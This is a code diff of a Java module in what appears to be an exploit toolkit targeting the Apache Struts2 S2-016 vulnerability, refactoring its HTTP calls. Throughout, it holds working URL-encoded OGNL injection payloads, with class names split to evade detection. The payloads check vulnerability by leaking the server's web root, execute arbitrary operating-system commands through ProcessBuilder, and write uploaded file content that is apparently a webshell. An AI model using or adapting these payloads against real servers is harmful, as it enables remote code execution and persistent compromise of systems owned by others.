@@ -1,10 +1,12 @@
 package fun.fireline.exp.apache.struts2;
 
 import fun.fireline.core.ExploitInterface;
-import fun.fireline.tools.HttpTool;
+import fun.fireline.tools.HttpTools;
+import fun.fireline.tools.Response;
+import fun.fireline.tools.Tools;
 
 import java.net.URLEncoder;
-import java.util.UUID;
+import java.util.HashMap;
 
 /**
  * @author yhy
@@ -20,46 +22,41 @@ public class S2_016 implements ExploitInterface {
     private String payload = "redirect:${%23req%3d%23context.get(%27co%27%2b%27m.open%27%2b%27symphony.xwo%27%2b%27rk2.disp%27%2b%27atcher.HttpSer%27%2b%27vletReq%27%2b%27uest%27),%23resp%3d%23context.get(%27co%27%2b%27m.open%27%2b%27symphony.xwo%27%2b%27rk2.disp%27%2b%27atcher.HttpSer%27%2b%27vletRes%27%2b%27ponse%27),%23resp.setCharacterEncoding(%27GB2312%27),%23resp.getWriter().print(%22web%22),%23resp.getWriter().print(%22path8888997:%22),%23resp.getWriter().print(%23req.getSession().getServletContext().getRealPath(%22/%22)),%23resp.getWriter().flush(),%23resp.getWriter().close()}";
 
     private String webPath;
+
+    private HashMap<String, String> headers = new HashMap();
+
     @Override
-    public boolean checkVul(String url) {
+    public String checkVul(String url) {
         this.target = url;
-        try {
-            String result = HttpTool.postHttpReuest(this.target, "application/x-www-form-urlencoded", this.payload, "UTF-8");
-            boolean flag = result.contains("webpath8888997");
-            if(flag) {
-                this.isVul = true;
-                this.webPath = result.replace("webpath8888997:", "");
-            }
-            return flag;
-        } catch (Exception e) {
-            logger.error(e);
+        this.headers.put("Content-type", "application/x-www-form-urlencoded");
+        Response response = HttpTools.post(this.target, this.payload, this.headers, "UTF-8");
+
+        if(response.getText() != null  && response.getText().contains("webpath8888997")) {
+            this.isVul = true;
+            this.webPath = response.getText().replace("webpath8888997:", "");
+            return "[+] 目标存在" + this.getClass().getSimpleName() + "漏洞 \t O(∩_∩)O~";
+        } else if (response.getError() != null) {
+            return "[-] 检测漏洞" + this.getClass().getSimpleName() + "失败， " + response.getError();
+        } else {
+            return "[-] 目标不存在" + this.getClass().getSimpleName() + "漏洞";
         }
-        return false;
+
     }
 
     @Override
     public String exeCmd(String cmd, String encoding) {
-        try {
-            String cmd_payload = "redirect:${%23req%3d%23context.get(%27co%27%2b%27m.open%27%2b%27symphony.xwo%27%2b%27rk2.disp%27%2b%27atcher.HttpSer%27%2b%27vletReq%27%2b%27uest%27),%23s%3dnew%20java.util.Scanner((new%20java.lang.ProcessBuilder(%27payload%27.toString().split(%27\\\\s%27))).start().getInputStream()).useDelimiter(%27\\\\AAAA%27),%23str%3d%23s.hasNext()?%23s.next():%27%27,%23resp%3d%23context.get(%27co%27%2b%27m.open%27%2b%27symphony.xwo%27%2b%27rk2.disp%27%2b%27atcher.HttpSer%27%2b%27vletRes%27%2b%27ponse%27),%23resp.setCharacterEncoding(%27encoding%27),%23resp.getWriter().println(%23str),%23resp.getWriter().flush(),%23resp.getWriter().close()}";
+        String cmd_payload = "redirect:${%23req%3d%23context.get(%27co%27%2b%27m.open%27%2b%27symphony.xwo%27%2b%27rk2.disp%27%2b%27atcher.HttpSer%27%2b%27vletReq%27%2b%27uest%27),%23s%3dnew%20java.util.Scanner((new%20java.lang.ProcessBuilder(%27payload%27.toString().split(%27\\\\s%27))).start().getInputStream()).useDelimiter(%27\\\\AAAA%27),%23str%3d%23s.hasNext()?%23s.next():%27%27,%23resp%3d%23context.get(%27co%27%2b%27m.open%27%2b%27symphony.xwo%27%2b%27rk2.disp%27%2b%27atcher.HttpSer%27%2b%27vletRes%27%2b%27ponse%27),%23resp.setCharacterEncoding(%27encoding%27),%23resp.getWriter().println(%23str),%23resp.getWriter().flush(),%23resp.getWriter().close()}";
 
-            String data = cmd_payload.replace("payload", cmd).replace("encoding", encoding);
-            String result = HttpTool.postHttpReuest(this.target, "application/x-www-form-urlencoded", data, encoding);
-            return result;
+        String data = cmd_payload.replace("payload", cmd).replace("encoding", encoding);
 
-        } catch (Exception e) {
-            logger.error(e);
-        }
-        return "fail";
+        this.headers.put("Content-type", "application/x-www-form-urlencoded");
+        Response response = HttpTools.post(this.target, data, headers, encoding);
+        return Tools.regReplace(response.getText());
     }
 
     @Override
     public String getWebPath() {
-        try {
-           return this.webPath;
-        } catch (Exception e) {
-            logger.error(e);
-        }
-        return "命令执行失败";
+        return this.webPath;
     }
 
     @Override
@@ -71,7 +68,10 @@ public class S2_016 implements ExploitInterface {
 
         payload = payload.replace("PATH", filename).replace("SHELL", fileContent);
 
-        String result = HttpTool.postHttpReuest(this.target, "application/x-www-form-urlencoded", payload, "UTF-8");
+        this.headers.put("Content-type", "application/x-www-form-urlencoded");
+        Response response = HttpTools.post(this.target, payload, headers, "UTF-8");
+
+        String result = response.getText();
 
         if(result.contains("Ok0Kok")) {
             result = result + "  上传成功! ";
